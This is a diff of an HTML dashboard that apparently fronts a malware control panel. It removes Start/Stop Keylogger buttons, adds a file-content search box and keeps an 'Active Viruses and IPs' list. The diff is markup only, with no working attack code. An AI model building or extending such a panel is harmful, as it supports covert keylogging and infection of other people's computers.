@@ -10,7 +10,7 @@
 <body>
     <header>
         <h1>Computer Dashboard</h1>
-        <p>Explore available computers, view contents, and control keyloggers securely.</p>
+        <p>Explore available computers and their contents securely.</p>
     </header>
     
     <main>
@@ -20,16 +20,15 @@
         </section>
         
         <section id="computer-content">
-            <h2>Computer Content</h2>
-            <div id="control-panel">
-                <button id="start-keylogger" class="control-btn start">Start Keylogger</button>
-                <button id="stop-keylogger" class="control-btn stop">Stop Keylogger</button>
-                <p id="control-status" class="status-message"></p>
-            </div>
-            <pre id="content-area">Select a computer to view its content.</pre>
-            <div id="additional-info" style="display: none;">
-                <h3>Active Viruses and IPs</h3>
-                <ul id="virus-list"></ul>
+    <h2>Computer Content</h2>
+    <div class="search-container">
+        <input type="text" id="search-input" placeholder="Search file content...">
+        <button onclick="searchContent()">Search</button>
+    </div>
+    <pre id="content-area">Select a computer to view its content.</pre>
+    <div id="additional-info" style="display: none;">
+        <h3>Active Viruses and IPs</h3>
+        <ul id="virus-list"></ul>
             </div>
         </section>
     </main>
